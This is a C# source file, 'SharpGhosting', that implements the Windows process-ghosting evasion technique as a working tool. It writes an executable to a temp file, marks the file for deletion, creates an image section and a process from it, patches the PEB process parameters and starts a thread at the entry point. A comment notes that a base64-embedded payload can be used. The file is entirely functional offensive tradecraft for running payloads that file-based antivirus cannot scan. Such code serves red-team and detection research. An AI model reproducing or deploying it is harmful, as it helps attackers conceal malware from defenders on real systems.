using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace SharpGhosting
{
    partial class Ghosting
    {
        public static void Main(string[] args)
        {
            string realExe = null;
            string fakeExe = null;
            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "-real")
                {
                    if (File.Exists(args[i + 1]))
                    {
                        Console.WriteLine("[*] Real: {0}", args[i + 1]);
                        realExe = args[i + 1];
                    }
                }

                if (args[i] == "-fake")
                {
                    if (!File.Exists(args[i + 1]) && Directory.Exists(Path.GetDirectoryName(args[i + 1])))
                    {
                        fakeExe = args[i + 1];
                        Console.WriteLine("[*] Fake: {0}", fakeExe);
                    }
                    else
                    {
                        Console.WriteLine("[~] The fake file may exist, or the path to the file did not. Generating temp filename.");
                    }
                }

                if (args[i] == "-h")
                {
                    Console.WriteLine("\n\t\tSharpGhosting");
                    Console.WriteLine("-real: the real executable you wish to spawn. [REQUIRED]");
                    Console.WriteLine("-fake: the filepath to a place where you want to temporarily hold a file.");
                    Environment.Exit(0);
                }
            }

            if (fakeExe == null)
            {
                fakeExe = Path.GetTempFileName();
                Console.WriteLine("[*] Fake: {0}", fakeExe);
            }

            if (realExe != null)
            {
                SpawnProcess(realExe, fakeExe);
            }
        }

        public static void SpawnProcess(string exeToRun, string fakeExe)
        {
            IntPtr fptrPeModule = CreateFile(fakeExe, EFileAccess.Delete | EFileAccess.Synchronize | EFileAccess.GenericRead | EFileAccess.GenericWrite, EFileShare.Read | EFileShare.Write, IntPtr.Zero, ECreationDisposition.OpenAlways, 0, IntPtr.Zero);

            //string base64 = @"<base64>";
            //byte[] realExe = Convert.FromBase64String(base64); this works too if you wanna avoid specifying "-real" and would rather put a base64 encoded string on the line above.
            byte[] realExe = File.ReadAllBytes(exeToRun);
            
            uint numWritten;
            uint entryPoint = GetEntryPoint(realExe.Take(4096).ToArray());
            System.Threading.NativeOverlapped overlap = new System.Threading.NativeOverlapped();
            WriteFile(fptrPeModule, realExe, (uint)realExe.Length, out numWritten, ref overlap);

            FILE_DISPOSITION_INFO FDI = new FILE_DISPOSITION_INFO();
            FDI.DeleteFile = true;

            if (!SetFileInformationByHandle(fptrPeModule, FileInformationClass.FileDispositionInfo, ref FDI, Marshal.SizeOf(FDI)))
            {
                Console.WriteLine("[!] SetFileInformationByHandle() Error: {0}", Marshal.GetLastWin32Error().ToString());
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[+] File marked as delete on close!");
            }

            IntPtr hSection = IntPtr.Zero;
            long maxSize = 0;
            uint ntCreate = NtCreateSection(ref hSection, 0x0F001F, IntPtr.Zero, ref maxSize, 0x02, 0x1000000, fptrPeModule);
            if (ntCreate == 0)
            {
                Console.WriteLine("[+] NtCreateSection() success!");
            }
            else
            {
                Console.WriteLine("[-] NtCreateSection() failed. Exiting.");
                Environment.Exit(0);
            }
            NtClose(fptrPeModule);

            IntPtr hProcess = IntPtr.Zero;
            ntCreate = NtCreateProcessEx(ref hProcess, 0x001F0FFF/*ALL_ACCESS*/, IntPtr.Zero, Process.GetCurrentProcess().Handle, 4, hSection, IntPtr.Zero, IntPtr.Zero, 0);
            if (ntCreate == 0)
            {
                Console.WriteLine("[+] NtCreateProcessEx() success!");
            }
            else
            {
                Console.WriteLine("[!] NtCreateProcessEx() failed. Exiting.");
                Environment.Exit(0);
            }

            if (!SetupProcessParameters(hProcess, fakeExe))
            {
                Console.WriteLine("[!] Failed to setup process parameters. Exiting.");
                Environment.Exit(0);
            }

            IntPtr hThread = IntPtr.Zero;
            IntPtr procEntry = (IntPtr)(FetchPEB(hProcess).ToInt64() + entryPoint);
            ntCreate = NtCreateThreadEx(ref hThread, 2097151, IntPtr.Zero, hProcess, (IntPtr)procEntry, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (ntCreate == 0)
            {
                Console.WriteLine("[+] NtCreateThreadEx() success!");
            }
            else
            {
                Console.WriteLine("[!] NtCreateThreadEx() failed. Exiting.");
                Environment.Exit(0);
            }
        }

        public static uint GetEntryPoint(byte[] pe_buffer)
        {
            GCHandle pPEBuffer = GCHandle.Alloc(pe_buffer, GCHandleType.Pinned);
            IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(pPEBuffer.AddrOfPinnedObject(), typeof(IMAGE_DOS_HEADER));

            IntPtr pNTHeader = (IntPtr)(pPEBuffer.AddrOfPinnedObject().ToInt64() + dosHeader.e_lfanew);
            IMAGE_NT_HEADERS64 ntHeader = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(pNTHeader, typeof(IMAGE_NT_HEADERS64));
            return ntHeader.OptionalHeader.AddressOfEntryPoint;
        }

        public static IntPtr FetchPEB(IntPtr hProcess)
        {
            PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
            long pSize;
            NtQueryInformationProcess(hProcess, 0x00, out pbi, Marshal.SizeOf(pbi), out pSize);
            byte[] pebBytes = new byte[0x40];
            uint numRead = 0;
            NtReadVirtualMemory(hProcess, pbi.PebBaseAddress, pebBytes, (uint)pebBytes.Length, ref numRead);

            GCHandle pPEB = GCHandle.Alloc(pebBytes, GCHandleType.Pinned);
            PEB peb = (PEB)Marshal.PtrToStructure(pPEB.AddrOfPinnedObject(), typeof(PEB));

            return peb.ImageBaseAddress;
        }

        // Credit to FuzzySecurity's SwampThing for SetupProcessParameters(), EmitUnicodeString(), WriteRemoteMem(), PBI()
        // See references
        public static bool SetupProcessParameters(IntPtr hProcess, string targetPath)
        {
            string WinDir = Environment.GetEnvironmentVariable("windir");
            IntPtr uSystemDir = EmitUnicodeString((WinDir + "\\System32"));
            IntPtr uLaunchPath = EmitUnicodeString(targetPath);
            IntPtr uWindowName = EmitUnicodeString("");
            IntPtr environment = IntPtr.Zero;
            //CreateEnvironmentBlock(out environment, IntPtr.Zero, true);

            IntPtr pProcessParams = IntPtr.Zero;
            uint RtlCreateSuccess = RtlCreateProcessParametersEx(ref pProcessParams, uLaunchPath, uSystemDir, uSystemDir, uLaunchPath, environment, uWindowName, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 1);
            if (RtlCreateSuccess != 0)
            {
                Console.WriteLine("[!] Failed to create process parameters");
                return false;
            }
            else
            {
                Console.WriteLine("[+] RtlCreateProcessParametersEx success!");
            }

            Int32 iProcessParamsSize = Marshal.ReadInt32((IntPtr)((Int64)pProcessParams + 4));
            VirtualAllocEx(hProcess, pProcessParams, (UInt32)iProcessParamsSize, 0x3000, (Int32)AllocationProtect.PAGE_READWRITE);
            bool bRemoteWriteSuccess = WriteRemoteMem(hProcess, pProcessParams, pProcessParams, iProcessParamsSize, AllocationProtect.PAGE_READWRITE);
            if (!bRemoteWriteSuccess)
            {
                Console.WriteLine("[!] Failed to allocate custom RTL_USER_PROCESS_PARAMETERS");
                return false;
            }

            IntPtr pRewriteProcessParams = Marshal.AllocHGlobal(0x8);
            Marshal.WriteInt64(pRewriteProcessParams, (Int64)pProcessParams);

            bRemoteWriteSuccess = WriteRemoteMem(hProcess, pRewriteProcessParams, (IntPtr)((PBI(hProcess).PebBaseAddress).ToInt64() + 0x20), 0x8, AllocationProtect.PAGE_READWRITE);
            if (!bRemoteWriteSuccess)
            {
                Console.WriteLine("[!] Failed to rewrite PEB->pProcessParameters");
                return false;
            }

            return true;
        }
        public static IntPtr EmitUnicodeString(String Data)
        {
            UNICODE_STRING StringObject = new UNICODE_STRING();
            StringObject.Length = (UInt16)(Data.Length * 2);
            StringObject.MaximumLength = (UInt16)(StringObject.Length + 1);
            StringObject.Buffer = Marshal.StringToHGlobalUni(Data);
            IntPtr pUnicodeString = Marshal.AllocHGlobal(16);
            Marshal.StructureToPtr(StringObject, pUnicodeString, true);
            return pUnicodeString;
        }

        public static bool WriteRemoteMem(IntPtr hProc, IntPtr pSource, IntPtr pDest, Int32 Size, AllocationProtect Protect)
        {

            UInt32 BytesWritten = 0;
            bool bRemoteWrite = WriteProcessMemory(hProc, pDest, pSource, (uint)Size, ref BytesWritten);
            if (!bRemoteWrite)
            {
                return false;
            }

            UInt32 OldProtect = 0;
            bool bProtect = VirtualProtectEx(hProc, pDest, (uint)Size, Protect, ref OldProtect);
            if (!bProtect)
            {
                return false;
            }

            return true;
        }
        public static PROCESS_BASIC_INFORMATION PBI(IntPtr hProc)
        {
            PROCESS_BASIC_INFORMATION PBI = new PROCESS_BASIC_INFORMATION();
            int PBI_Size = Marshal.SizeOf(PBI);
            long RetLen = 0;
            NtQueryInformationProcess(hProc, 0, out PBI, PBI_Size, out RetLen);
            return PBI;
        }
    }
}
